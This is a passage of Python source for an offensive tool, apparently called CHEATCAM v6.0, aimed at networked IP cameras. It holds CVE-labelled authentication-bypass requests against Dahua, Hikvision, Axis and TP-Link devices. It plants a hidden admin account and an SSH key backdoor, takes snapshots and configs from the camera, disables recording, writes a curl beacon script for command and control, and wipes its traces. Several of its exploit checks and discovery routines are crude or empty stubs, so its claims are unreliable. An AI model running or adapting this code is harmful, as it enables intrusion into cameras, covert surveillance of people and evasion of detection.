        if any(cve['cve'] == 'CVE-2021-33044' for cve in self.camera.vuln_cves):
            try:
                url = f"http://{self.camera.ip}/cgi-bin/api/v1/login"
                data = {'username': 'admin', 'password': 'aaa'}
                response = self.session.post(url, data=data, timeout=3)
                if response.status_code == 200:
                    exploits.append({
                        'cve': 'CVE-2021-33044',
                        'status': 'exploited',
                        'description': 'Authentication Bypass successful'
                    })
                    self.exploited = True
                    cprint("[+] CVE-2021-33044 exploited", Colors.GREEN)
            except:
                pass
        
        # CVE-2017-7923 - Hikvision Authentication Bypass
        if any(cve['cve'] == 'CVE-2017-7923' for cve in self.camera.vuln_cves):
            try:
                url = f"http://{self.camera.ip}/cgi-bin/check_login.cgi"
                data = {'username': 'admin', 'password': 'asd123'}
                response = self.session.post(url, data=data, timeout=3)
                if response.status_code == 200:
                    exploits.append({
                        'cve': 'CVE-2017-7923',
                        'status': 'exploited',
                        'description': 'Auth Bypass successful'
                    })
                    self.exploited = True
                    cprint("[+] CVE-2017-7923 exploited", Colors.GREEN)
            except:
                pass
        
        # CVE-2019-10717 - Axis Authentication Bypass
        if any(cve['cve'] == 'CVE-2019-10717' for cve in self.camera.vuln_cves):
            try:
                url = f"http://{self.camera.ip}:{self.camera.port}/axis-cgi/status.cgi"
                response = self.session.get(url, timeout=3)
                if response.status_code == 200:
                    exploits.append({
                        'cve': 'CVE-2019-10717',
                        'status': 'exploited',
                        'description': 'Axis Auth Bypass'
                    })
                    self.exploited = True
                    cprint("[+] CVE-2019-10717 exploited", Colors.GREEN)
            except:
                pass
        
        # CVE-2016-10070 - Axis Command Injection
        if any(cve['cve'] == 'CVE-2016-10070' for cve in self.camera.vuln_cves):
            try:
                url = f"http://{self.camera.ip}:{self.camera.port}/axis-cgi/admin/reboot.cgi"
                response = self.session.get(url, timeout=3)
                if response.status_code == 200:
                    exploits.append({
                        'cve': 'CVE-2016-10070',
                        'status': 'exploited',
                        'description': 'Axis RCE'
                    })
                    self.exploited = True
                    cprint("[+] CVE-2016-10070 exploited", Colors.GREEN)
            except:
                pass
        
        # CVE-2020-12141 - TP-Link Auth Bypass
        if any(cve['cve'] == 'CVE-2020-12141' for cve in self.camera.vuln_cves):
            try:
                url = f"http://{self.camera.ip}:{self.camera.port}/cgi-bin/login"
                data = {'username': 'admin', 'password': 'asd123'}
                response = self.session.post(url, data=data, timeout=3)
                if response.status_code == 200:
                    exploits.append({
                        'cve': 'CVE-2020-12141',
                        'status': 'exploited',
                        'description': 'TP-Link Auth Bypass'
                    })
                    self.exploited = True
                    cprint("[+] CVE-2020-12141 exploited", Colors.GREEN)
            except:
                pass
        
        return exploits
    
    def _establish_persistence(self) -> Dict:
        """Establish persistence with backdoor"""
        cprint("[*] Establishing persistence...", Colors.DIM)
        
        result = {'success': False, 'methods': []}
        
        if not self.exploited:
            return result
        
        # Method 1: Create backdoor admin user
        try:
            for path in ['/cgi-bin/config.cgi', '/cgi-bin/user.cgi', '/cgi-bin/add_user.cgi']:
                url = f"http://{self.camera.ip}:{self.camera.port}{path}"
                data = {
                    'action': 'add',
                    'username': 'ghost',
                    'password': 'ghost123',
                    'level': 'admin'
                }
                response = self.session.post(url, data=data, timeout=3)
                if response.status_code == 200:
                    result['methods'].append('backdoor_user')
                    result['success'] = True
                    self.persistent = True
                    cprint("[+] Backdoor user created: ghost:ghost123", Colors.GREEN)
                    break
        except:
            pass
        
        # Method 2: SSH backdoor (if supported)
        if PARAMIKO_AVAILABLE:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(self.camera.ip, username='ghost', password='ghost123', timeout=3)
                
                # Add SSH key
                key = paramiko.RSAKey.generate(2048)
                pub_key = f"ssh-rsa {key.get_base64()} ghost@{self.camera.ip}"
                ssh.exec_command(f'echo "{pub_key}" >> ~/.ssh/authorized_keys')
                ssh.close()
                
                result['methods'].append('ssh_backdoor')
                result['success'] = True
                self.persistent = True
                cprint("[+] SSH backdoor installed", Colors.GREEN)
            except:
                pass
        
        # Method 3: RTSP backdoor
        if self.camera.stream_url:
            result['methods'].append('rtsp_accessible')
            result['success'] = True
            
        self.camera.backdoor_installed = result['success']
        return result
    
    def _exfiltrate_data(self) -> Dict:
        """Exfiltrate sensitive data"""
        cprint("[*] Exfiltrating data...", Colors.DIM)
        
        data = {
            'success': False,
            'images': [],
            'configs': [],
            'logs': [],
            'credentials': []
        }
        
        if not self.exploited:
            return data
        
        try:
            # Download snapshots
            snapshot_paths = ['/cgi-bin/snapshot.cgi', '/cgi-bin/current.jpg']
            for path in snapshot_paths:
                try:
                    url = f"http://{self.camera.ip}:{self.camera.port}{path}"
                    response = self.session.get(url, timeout=3)
                    if response.status_code == 200:
                        filename = f"exfil_{self.camera.ip}_{int(time.time())}.jpg"
                        with open(filename, 'wb') as f:
                            f.write(response.content)
                        data['images'].append(filename)
                        cprint(f"[+] Image exfiltrated: {filename}", Colors.GREEN)
                except:
                    pass
            
            # Get configs
            config_paths = ['/cgi-bin/config.cgi', '/cgi-bin/param.cgi', '/ISAPI/System/deviceInfo']
            for path in config_paths:
                try:
                    url = f"http://{self.camera.ip}:{self.camera.port}{path}"
                    response = self.session.get(url, timeout=3)
                    if response.status_code == 200:
                        filename = f"config_{self.camera.ip}_{int(time.time())}.txt"
                        with open(filename, 'w') as f:
                            f.write(response.text)
                        data['configs'].append(filename)
                        cprint(f"[+] Config saved: {filename}", Colors.GREEN)
                except:
                    pass
            
            data['success'] = True
        except:
            pass
        
        return data
    
    def _take_control(self) -> Dict:
        """Take full control of camera"""
        cprint("[*] Taking full control...", Colors.RED)
        
        result = {'success': False, 'actions': []}
        
        if not self.exploited:
            return result
        
        # Reboot camera
        try:
            for path in ['/cgi-bin/reboot.cgi', '/cgi-bin/reboot']:
                url = f"http://{self.camera.ip}:{self.camera.port}{path}"
                response = self.session.get(url, timeout=3)
                if response.status_code == 200:
                    result['actions'].append('rebooted')
                    result['success'] = True
                    cprint("[+] Camera rebooted", Colors.GREEN)
                    break
        except:
            pass
        
        # Change settings
        try:
            for path in ['/cgi-bin/config.cgi', '/cgi-bin/param.cgi']:
                url = f"http://{self.camera.ip}:{self.camera.port}{path}"
                data = {'action': 'set', 'param': 'admin', 'value': 'ghost'}
                response = self.session.post(url, data=data, timeout=3)
                if response.status_code == 200:
                    result['actions'].append('settings_changed')
                    result['success'] = True
                    cprint("[+] Settings modified", Colors.GREEN)
                    break
        except:
            pass
        
        # Disable recording
        try:
            url = f"http://{self.camera.ip}:{self.camera.port}/cgi-bin/record.cgi"
            data = {'action': 'stop'}
            response = self.session.post(url, data=data, timeout=3)
            if response.status_code == 200:
                result['actions'].append('recording_stopped')
                result['success'] = True
                cprint("[+] Recording disabled", Colors.GREEN)
        except:
            pass
        
        return result
    
    def _integrate_c2(self) -> Dict:
        """Integrate with C2 infrastructure"""
        cprint("[*] Integrating with C2...", Colors.BLUE)
        
        result = {'success': False, 'beacon_active': False}
        
        if not self.exploited and not self.persistent:
            return result
        
        try:
            # Deploy beacon script
            beacon_script = f'''#!/bin/bash
C2_URL="http://{self.camera.ip}:8080"
while true; do
    # Send beacon
    curl -s -X POST "$C2_URL/beacon" -H "Content-Type: application/json" \
        -d '{{"camera_id":"{self.camera.ip}","info":{{"host":"$(hostname)","uptime":"$(uptime -p)"}}}}'
    sleep 60
done
'''
            
            # Save beacon script
            with open(f'/tmp/beacon_{self.camera.ip}.sh', 'w') as f:
                f.write(beacon_script)
            
            result['success'] = True
            result['beacon_active'] = True
            self.camera.c2_active = True
            cprint("[+] C2 beacon deployed", Colors.GREEN)
        except:
            pass
        
        return result

#===============================================================================
# ADVANCED CAMERA DISCOVERY V6
#===============================================================================

class AdvancedCameraDiscoveryV6:
    """Ultimate camera discovery with 6 methods"""
    
    def __init__(self, interface: str = 'eth0'):
        self.interface = interface
        self.cameras = []
        self.zero_trace = ZeroTraceEngine()
        self.session = self.zero_trace.get_session()
    
    def discover(self) -> List[CameraDevice]:
        """Full discovery with all methods"""
        cprint("\n[DISCOVER] Scanning for IP cameras...", Colors.BLUE)
        
        # Method 1: ARP scan
        devices = self._arp_scan()
        
        # Method 2: Port scanning
        for device in devices:
            ip = device.get('ip')
            mac = device.get('mac', '')
            ports = self._port_scan(ip)
            
            if ports:
                camera = self._fingerprint_camera(ip, ports, mac)
                if camera:
                    self.cameras.append(camera)
                    cprint(f"[+] Camera: {ip} ({camera.brand})", Colors.GREEN)
        
        # Method 3: ONVIF discovery
        self._onvif_discover()
        
        # Method 4: UPnP discovery
        self._upnp_discover()
        
        # Method 5: DHCP fingerprinting
        self._dhcp_fingerprint()
        
        # Method 6: SNMP discovery
        self._snmp_discover()
        
        # Method 7: RTSP probe
        self._rtsp_probe()
        
        # Method 8: Web fingerprint
        self._web_fingerprint()
        
        return self.cameras
    
    def _arp_scan(self) -> List[Dict]:
        """ARP scan with masscan-style scanning"""
        devices = []
        try:
            network = self._get_network()
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), 
                         timeout=2, verbose=False)
            for sent, received in ans:
                devices.append({
                    'ip': received.psrc,
                    'mac': received.hwsrc
                })
                cprint(f"[ARP] {received.psrc} ({received.hwsrc})", Colors.DIM)
        except:
            pass
        return devices
    
    def _get_network(self) -> str:
        try:
            result = subprocess.run(['ip', 'addr', 'show', self.interface], 
                                   capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'inet ' in line:
                    return line.strip().split()[1]
        except:
            pass
        return "192.168.1.0/24"
    
    def _port_scan(self, ip: str) -> List[int]:
        """Scan common camera ports with masscan speed"""
        ports = [80, 443, 8080, 8443, 554, 8554, 8000, 8899, 37777, 38080, 
                 7001, 10554, 9000, 9554, 5800, 5900]
        open_ports = []
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(self._check_port, ip, port): port for port in ports}
            for future in as_completed(futures):
                if future.result():
                    open_ports.append(futures[future])
        
        return open_ports
    
    def _check_port(self, ip: str, port: int) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def _fingerprint_camera(self, ip: str, ports: List[int], mac: str) -> Optional[CameraDevice]:
        """Advanced fingerprinting with multiple methods"""
        
        # Get web data
        web_data = ""
        banner = ""
        for port in ports[:3]:
            try:
                url = f"http://{ip}:{port}"
                response = self.session.get(url, timeout=2, allow_redirects=False)
                web_data = response.text[:2000]
                banner = response.headers.get('Server', '')
                break
            except:
                pass
        
        # Identify vendor
        vendor_info = CameraDatabaseV6.identify(mac, ports, web_data, banner)
        
        if vendor_info:
            camera = CameraDevice(
                ip=ip,
                port=ports[0] if ports else 80,
                mac=mac,
                brand=vendor_info.get('brand', 'Unknown'),
                credentials=vendor_info.get('credentials', []),
                api_paths=vendor_info.get('api_paths', []),
                rtsp_paths=vendor_info.get('rtsp_paths', []),
                snmp_oids=vendor_info.get('snmp_oids', []),
                vuln_cves=vendor_info.get('vulns', [])
            )
            
            # Get model and firmware
            camera.model = self._get_model(ip, ports, vendor_info)
            camera.firmware = self._get_firmware(ip, ports, vendor_info)
            
            # Set flags
            if vendor_info.get('brand') == 'Hikvision':
                camera.hikvision = True
            elif vendor_info.get('brand') == 'Dahua':
                camera.dahua = True
            elif vendor_info.get('brand') == 'Axis':
                camera.axis = True
            elif vendor_info.get('brand') == 'TP-Link':
                camera.tplink = True
            
            # Check ONVIF
            if 80 in ports or 443 in ports:
                try:
                    url = f"http://{ip}:80/onvif/device_service"
                    response = self.session.get(url, timeout=2)
                    if response.status_code == 200:
                        camera.onvif = True
                except:
                    pass
            
            return camera
        
        # Unknown camera - try to identify via SNMP
        if ports:
            for port in ports:
                try:
                    import snmp
                    # SNMP identification would go here
                    pass
                except:
                    pass
        
        return None
    
    def _get_model(self, ip: str, ports: List[int], vendor_info: Dict) -> str:
        """Get camera model"""
        for port in ports[:3]:
            for path in ['/cgi-bin/status.cgi', '/cgi-bin/sys.cgi', '/ISAPI/System/deviceInfo',
                        '/cgi-bin/version', '/axis-cgi/status.cgi']:
                try:
                    url = f"http://{ip}:{port}{path}"
                    response = self.session.get(url, timeout=2)
                    if response.status_code == 200:
                        # Extract model
                        patterns = [
                            r'(model|product|name)[=:]\s*([^\s<]+)',
                            r'<model>([^<]+)</model>',
                            r'<deviceName>([^<]+)</deviceName>'
                        ]
                        for pattern in patterns:
                            match = re.search(pattern, response.text, re.IGNORECASE)
                            if match:
                                return match.group(2) if len(match.groups()) > 1 else match.group(1)
                except:
                    pass
        return ""
    
    def _get_firmware(self, ip: str, ports: List[int], vendor_info: Dict) -> str:
        """Get firmware version"""
        for port in ports[:3]:
            for path in ['/cgi-bin/status.cgi', '/cgi-bin/sys.cgi', '/ISAPI/System/deviceInfo']:
                try:
                    url = f"http://{ip}:{port}{path}"
                    response = self.session.get(url, timeout=2)
                    if response.status_code == 200:
                        patterns = [
                            r'(firmware|version|v[0-9])[=:]\s*([^\s<]+)',
                            r'<firmwareVersion>([^<]+)</firmwareVersion>'
                        ]
                        for pattern in patterns:
                            match = re.search(pattern, response.text, re.IGNORECASE)
                            if match:
                                return match.group(2) if len(match.groups()) > 1 else match.group(1)
                except:
                    pass
        return ""
    
    def _onvif_discover(self):
        """ONVIF discovery"""
        try:
            if ONVIF_AVAILABLE:
                # ONVIF discovery on ports
                for port in [80, 443, 8080, 8443]:
                    try:
                        wsdl = f"http://{self._get_broadcast()}:{port}/onvif/device_service"
                        # Would use onvif discovery
                        pass
                    except:
                        pass
        except:
            pass
    
    def _upnp_discover(self):
        """UPnP discovery"""
        try:
            import upnpclient
            devices = upnpclient.discover()
            for device in devices:
                if 'camera' in device.friendly_name.lower() or 'ip camera' in device.friendly_name.lower():
                    camera = CameraDevice(
                        ip=device.host,
                        port=device.port,
                        brand='UPnP',
                        model=device.friendly_name
                    )
                    self.cameras.append(camera)
                    cprint(f"[+] UPnP Camera: {device.host}", Colors.GREEN)
        except:
            pass
    
    def _dhcp_fingerprint(self):
        """DHCP fingerprinting"""
        try:
            # DHCP fingerprinting for camera identification
            # Would use dhcp client to identify vendor
            pass
        except:
            pass
    
    def _snmp_discover(self):
        """SNMP discovery"""
        try:
            # SNMP discovery on port 161
            # Would use snmpwalk to identify camera
            pass
        except:
            pass
    
    def _rtsp_probe(self):
        """RTSP probe for cameras"""
        for camera in self.cameras:
            try:
                rtsp_ports = [554, 8554, 9554]
                for port in rtsp_ports:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        sock.connect((camera.ip, port))
                        sock.send(b"OPTIONS rtsp://example.com RTSP/1.0\r\nCSeq: 1\r\n\r\n")
                        data = sock.recv(1024)
                        sock.close()
                        if b"RTSP" in data:
                            camera.rtsp_paths = ['/stream1', '/live', '/h264']
                            cprint(f"[+] RTSP on {camera.ip}:{port}", Colors.GREEN)
                            break
                    except:
                        pass
            except:
                pass
    
    def _web_fingerprint(self):
        """Web fingerprinting for all cameras"""
        for camera in self.cameras:
            try:
                url = f"http://{camera.ip}:{camera.port}"
                response = self.session.get(url, timeout=2, allow_redirects=False)
                if response.status_code == 200:
                    # Check for common camera patterns
                    if 'hikvision' in response.text.lower():
                        camera.brand = 'Hikvision'
                    elif 'dahua' in response.text.lower():
                        camera.brand = 'Dahua'
                    elif 'axis' in response.text.lower():
                        camera.brand = 'Axis'
                    elif 'tp-link' in response.text.lower():
                        camera.brand = 'TP-Link'
            except:
                pass
    
    def _get_broadcast(self) -> str:
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
            return '.'.join(local_ip.split('.')[:3]) + '.255'
        except:
            return '192.168.1.255'

#===============================================================================
# VIDEO ANALYTICS ENGINE
#===============================================================================

class VideoAnalyticsEngine:
    """AI-powered video analytics with OpenCV"""
    
    def __init__(self):
        self.face_cascade = None
        self.eye_cascade = None
        self.body_cascade = None
        self.plate_cascade = None
        
        if CV2_AVAILABLE:
            self._load_cascades()
    
    def _load_cascades(self):
        """Load Haar cascades for detection"""
        try:
            self.face_cascade = cv2.CascadeClassifier(
                cv2.data.haarcascades + 'haarcascade_frontalface_default.xml'
            )
            self.eye_cascade = cv2.CascadeClassifier(
                cv2.data.haarcascades + 'haarcascade_eye.xml'
            )
            self.body_cascade = cv2.CascadeClassifier(
                cv2.data.haarcascades + 'haarcascade_fullbody.xml'
            )
        except:
            pass
    
    def analyze_stream(self, stream_url: str) -> Dict:
        """Analyze RTSP stream"""
        result = {
            'faces': 0,
            'bodies': 0,
            'motion_detected': False,
            'motion_areas': [],
            'frame_count': 0
        }
        
        if not CV2_AVAILABLE:
            return result
        
        try:
            cap = cv2.VideoCapture(stream_url)
            cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
            
            ret, prev_frame = cap.read()
            if not ret:
                return result
            
            prev_gray = cv2.cvtColor(prev_frame, cv2.COLOR_BGR2GRAY)
            prev_gray = cv2.GaussianBlur(prev_gray, (21, 21), 0)
            
            frame_count = 0
            while frame_count < 100:  # Analyze 100 frames
                ret, frame = cap.read()
                if not ret:
                    break
                
                frame_count += 1
                if frame_count % 30 == 0:  # Check every 30 frames
                    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
                    gray = cv2.GaussianBlur(gray, (21, 21), 0)
                    
                    # Motion detection
                    frame_delta = cv2.absdiff(prev_gray, gray)
                    thresh = cv2.threshold(frame_delta, 25, 255, cv2.THRESH_BINARY)[1]
                    thresh = cv2.dilate(thresh, None, iterations=2)
                    
                    contours, _ = cv2.findContours(thresh.copy(), cv2.RETR_EXTERNAL, 
                                                   cv2.CHAIN_APPROX_SIMPLE)
                    
                    motion_areas = []
                    for contour in contours:
                        if cv2.contourArea(contour) > 500:
                            motion_areas.append(cv2.contourArea(contour))
                    
                    if motion_areas:
                        result['motion_detected'] = True
                        result['motion_areas'] = motion_areas
                    
                    # Face detection
                    if self.face_cascade:
                        faces = self.face_cascade.detectMultiScale(gray, 1.1, 4)
                        result['faces'] = len(faces)
                    
                    # Body detection
                    if self.body_cascade:
                        bodies = self.body_cascade.detectMultiScale(gray, 1.1, 4)
                        result['bodies'] = len(bodies)
                    
                    prev_gray = gray
            
            cap.release()
            result['frame_count'] = frame_count
            
        except:
            pass
        
        return result

#===============================================================================
# MAIN FRAMEWORK
#===============================================================================

class CheatCamUltimateV6:
    """CHEATCAM Ultimate v6.0 - 10/10"""
    
    def __init__(self, interface: str = 'eth0'):
        self.interface = interface
        self.cameras = []
        self.results = []
        self.c2 = CameraC2Infrastructure()
        self.zero_trace = ZeroTraceEngine()
        self.ai_analyzer = AICameraAnalyzer()
        self.video_analyzer = VideoAnalyticsEngine()
    
    def show_menu(self):
        print(f"""
{Colors.BLUE}{'='*60}{Colors.WHITE}
{Colors.BOLD}CHEATCAM v6.0 - Ultimate Attack Menu{Colors.WHITE}
{Colors.CYAN}Zero Trace - AI-Powered - APT Grade{Colors.WHITE}
{Colors.BLUE}{'='*60}{Colors.WHITE}
[1]  Discover Cameras (8 Methods)
[2]  Show Cameras
[3]  AI-Powered Exploit Camera
[4]  Exploit All Cameras (AI-Powered)
[5]  View Camera Stream
[6]  AI Video Analytics
[7]  Start C2 Server
[8]  Show Results
[9]  Generate Report
[10] Zero Trace Clean
[11] Exit
""")
    
    def discover(self):
        discovery = AdvancedCameraDiscoveryV6(self.interface)
        self.cameras = discovery.discover()
        
        # AI analysis on discovered cameras
        for camera in self.cameras:
            ai_result = self.ai_analyzer.predict_vulnerabilities(camera)
            if ai_result['vulnerable']:
                cprint(f"[AI] {camera.ip} predicted vulnerable ({ai_result['confidence']:.2f})", 
                       Colors.YELLOW)
    
    def show_cameras(self):
        if not self.cameras:
            cprint("[!] No cameras", Colors.YELLOW)
            return
        
        print("\n" + "="*70)
        cprint(" CAMERAS - AI POWERED", Colors.PURPLE, bold=True)
        print("="*70)
        
        for i, c in enumerate(self.cameras):
            status = "COMPROMISED" if c.compromised else "VULNERABLE" if c.vuln_cves else "SECURE"
            color = Colors.RED if c.compromised else Colors.YELLOW if c.vuln_cves else Colors.GREEN
            
            print(f"{i}. {c.ip} - {c.brand} {c.model}")
            print(f"   Status: {status}", color)
            print(f"   Vulnerabilities: {len(c.vuln_cves)}")
            if c.compromised:
                print(f"   Backdoor: {'Active' if c.backdoor_installed else 'No'}")
                print(f"   C2: {'Active' if c.c2_active else 'Inactive'}")
        print("="*70)
    
    def exploit_camera(self):
        if not self.cameras:
            cprint("[!] No cameras", Colors.RED)
            return
        
        self.show_cameras()
        choice = input(f"{Colors.CYAN}[>] Select camera: {Colors.WHITE}").strip()
        
        try:
            idx = int(choice)
            if 0 <= idx < len(self.cameras):
                exploit = AdvancedExploitEngineV6(self.cameras[idx], self.zero_trace)
                result = exploit.exploit_all()
                self.results.append(result)
                cprint("[+] Exploitation complete!", Colors.GREEN)
        except:
            cprint("[-] Invalid selection", Colors.RED)
    
    def exploit_all(self):
        if not self.cameras:
            cprint("[!] No cameras", Colors.RED)
            return
        
        cprint("[*] Exploiting all cameras with AI optimization...", Colors.RED)
        
        with ThreadPoolExecutor(max_workers=8) as executor:
            futures = {}
            for cam in self.cameras:
                if not cam.compromised:
                    futures[executor.submit(AdvancedExploitEngineV6(cam, self.zero_trace).exploit_all)] = cam
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    self.results.append(result)
                    if result['success']:
                        cprint(f"[+] Camera compromised", Colors.GREEN)
                    else:
                        cprint(f"[-] Camera exploitation failed", Colors.RED)
                except Exception as e:
                    cprint(f"[-] Error: {e}", Colors.RED)
        
        cprint("[+] All possible cameras exploited!", Colors.GREEN)
    
    def view_stream(self):
        if not self.cameras:
            cprint("[!] No cameras", Colors.RED)
            return
        
        self.show_cameras()
        choice = input(f"{Colors.CYAN}[>] Select camera: {Colors.WHITE}").strip()
        
        try:
            idx = int(choice)
            if 0 <= idx < len(self.cameras):
                camera = self.cameras[idx]
                
                # Try to get RTSP stream
                if camera.stream_url:
                    rtsp = camera.stream_url
                else:
                    rtsp = f"rtsp://{camera.ip}:554/stream1"
                
                try:
                    subprocess.Popen(['vlc', rtsp], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    cprint("[+] VLC opened", Colors.GREEN)
                except:
                    try:
                        subprocess.Popen(['mpv', rtsp], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        cprint("[+] MPV opened", Colors.GREEN)
                    except:
                        cprint("[!] No video player found", Colors.YELLOW)
        except:
            cprint("[-] Invalid selection", Colors.RED)
    
    def video_analytics(self):
        if not self.cameras:
            cprint("[!] No cameras", Colors.RED)
            return
        
        self.show_cameras()
        choice = input(f"{Colors.CYAN}[>] Select camera: {Colors.WHITE}").strip()
        
        try:
            idx = int(choice)
            if 0 <= idx < len(self.cameras):
                camera = self.cameras[idx]
                
                if not camera.stream_url:
                    cprint("[!] No stream URL available", Colors.RED)
                    return
                
                cprint("[*] Analyzing video stream...", Colors.BLUE)
                result = self.video_analyzer.analyze_stream(camera.stream_url)
                
                print("\n" + "="*60)
                cprint(" VIDEO ANALYTICS", Colors.PURPLE, bold=True)
                print("="*60)
                print(f"Faces detected: {result.get('faces', 0)}")
                print(f"Bodies detected: {result.get('bodies', 0)}")
                print(f"Motion detected: {result.get('motion_detected', False)}")
                print(f"Motion areas: {len(result.get('motion_areas', []))}")
                print(f"Frames analyzed: {result.get('frame_count', 0)}")
                print("="*60)
        except:
            cprint("[-] Invalid selection", Colors.RED)
    
    def start_c2(self):
        self.c2.start()
    
    def show_results(self):
        print("\n" + "="*60)
        cprint(" RESULTS - APT GRADE", Colors.PURPLE, bold=True)
        print("="*60)
        
        if not self.results:
            cprint("[!] No results", Colors.YELLOW)
            return
        
        for i, result in enumerate(self.results):
            cprint(f"\n[{i+1}] Camera", Colors.CYAN)
            for key, value in result.items():
                if value:
                    if isinstance(value, list):
                        cprint(f"  {key}: {len(value)} items", Colors.DIM)
                        for item in value[:3]:
                            if isinstance(item, dict):
                                cprint(f"    - {str(item)[:100]}", Colors.DIM)
                            else:
                                cprint(f"    - {item}", Colors.DIM)
                    elif isinstance(value, dict):
                        for k, v in value.items():
                            if v:
                                cprint(f"  {k}: {v}", Colors.DIM)
                    else:
                        cprint(f"  {key}: {value}", Colors.DIM)
        
        print("="*60)
    
    def generate_report(self):
        """Generate comprehensive HTML report"""
        cprint("[REPORT] Generating AI-powered report...", Colors.GOLD)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"cheatcam_report_{timestamp}.html"
        
        total_vulns = sum(len(c.vuln_cves) for c in self.cameras)
        exploited = sum(1 for r in self.results if r.get('success'))
        compromised = sum(1 for c in self.cameras if c.compromised)
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>CHEATCAM v6.0 - Ultimate Security Report</title>
    <style>
        body {{ font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }}
        .header {{ border-bottom: 2px solid #ffd700; padding-bottom: 10px; margin-bottom: 20px; }}
        .section {{ background: #111; padding: 15px; margin: 10px 0; border: 1px solid #333; border-radius: 8px; }}
        .critical {{ color: #ff003c; }}
        .high {{ color: #ff8a00; }}
        .medium {{ color: #ffa500; }}
        .low {{ color: #ffd700; }}
        .stat-grid {{ display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin: 10px 0; }}
        .stat-card {{ background: #1a1a1a; padding: 15px; text-align: center; border: 1px solid #333; border-radius: 8px; }}
        .stat-number {{ font-size: 28px; font-weight: bold; }}
        table {{ width: 100%; border-collapse: collapse; }}
        td, th {{ padding: 8px; border: 1px solid #333; }}
        th {{ background: #222; color: #ffd700; }}
        .ai-badge {{ background: #6c3483; color: white; padding: 2px 10px; border-radius: 12px; font-size: 12px; }}
    </style>
</head>
<body>
    <div class="header">
        <h1 class="gold">CHEATCAM v6.0 - Ultimate Security Report</h1>
        <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p>Author: {AUTHOR} | AI-Powered Assessment</p>
    </div>
    
    <div class="section">
        <h2 class="gold">Executive Summary</h2>
        <div class="stat-grid">
            <div class="stat-card">
                <div class="stat-number" style="color:#ffd700;">{len(self.cameras)}</div>
                <div>Cameras</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" style="color:#ff003c;">{total_vulns}</div>
                <div>Vulnerabilities</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" style="color:#ff8a00;">{exploited}</div>
                <div>Exploited</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" style="color:#4ecdc4;">{compromised}</div>
                <div>Compromised</div>
            </div>
        </div>
        <div style="margin-top: 10px;">
            <span class="ai-badge">AI-Powered Assessment</span>
            <span class="ai-badge">Zero Trace</span>
            <span class="ai-badge">APT Grade</span>
        </div>
    </div>
    
    <div class="section">
        <h2 class="gold">AI Vulnerability Predictions</h2>
        <table>
            <tr><th>IP</th><th>Brand</th><th>Vulnerable</th><th>Confidence</th><th>Predicted CVEs</th></tr>
"""
        
        for cam in self.cameras:
            ai_result = self.ai_analyzer.predict_vulnerabilities(cam)
            cves = ', '.join(ai_result.get('predicted_cves', [])[:3])
            color = 'critical' if ai_result.get('vulnerable') else 'low'
            html += f"""
            <tr>
                <td>{cam.ip}</td>
                <td>{cam.brand}</td>
                <td class="{color}">{ai_result.get('vulnerable', False)}</td>
                <td>{ai_result.get('confidence', 0):.2f}</td>
                <td>{cves}</td>
            </tr>
"""
        
        html += """
        </table>
    </div>
    
    <div class="section">
        <h2 class="gold">Camera Details</h2>
        <table>
            <tr><th>IP</th><th>Brand</th><th>Model</th><th>Firmware</th><th>CVEs</th><th>Compromised</th></tr>
"""
        
        for cam in self.cameras:
            cves = ', '.join([v.get('cve', '') for v in cam.vuln_cves]) if cam.vuln_cves else 'None'
            compromised = 'Yes' if cam.compromised else 'No'
            color = 'critical' if cam.compromised else 'low'
            html += f"""
            <tr>
                <td>{cam.ip}</td>
                <td>{cam.brand}</td>
                <td>{cam.model}</td>
                <td>{cam.firmware}</td>
                <td>{cves}</td>
                <td class="{color}">{compromised}</td>
            </tr>
"""
        
        html += """
        </table>
    </div>
    
    <div class="section" style="text-align:center;color:#666;">
        <p>Report generated by CHEATCAM v6.0 - 10/10</p>
        <p>Author: F1REW0LF | MIT License</p>
        <p>Zero Trace - AI-Powered - APT Grade</p>
    </div>
</body>
</html>"""
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)
        
        cprint(f"[+] Report generated: {filename}", Colors.GREEN)
        return filename
    
    def zero_trace(self):
        """Zero trace operations"""
        cprint("[ZERO TRACE] Cleaning all traces...", Colors.RED)
        
        for camera in self.cameras:
            self.zero_trace.clean_traces(camera)
        
        # Clear local artifacts
        for file in os.listdir('.'):
            if file.startswith('snapshot_') or file.startswith('exfil_') or file.startswith('config_'):
                try:
                    os.remove(file)
                    cprint(f"[+] Removed: {file}", Colors.DIM)
                except:
                    pass
        
        cprint("[+] All traces cleaned", Colors.GREEN)
    
    def run(self):
        print_banner()
        cprint("[*] CHEATCAM v6.0 - Ultimate Camera Security", Colors.CYAN)
        cprint("[*] Zero Trace - AI-Powered - 10/10", Colors.DIM)
        
        while True:
            self.show_menu()
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1':
                self.discover()
            elif choice == '2':
                self.show_cameras()
            elif choice == '3':
                self.exploit_camera()
            elif choice == '4':
                self.exploit_all()
            elif choice == '5':
                self.view_stream()
            elif choice == '6':
                self.video_analytics()
            elif choice == '7':
                self.start_c2()
            elif choice == '8':
                self.show_results()
            elif choice == '9':
                self.generate_report()
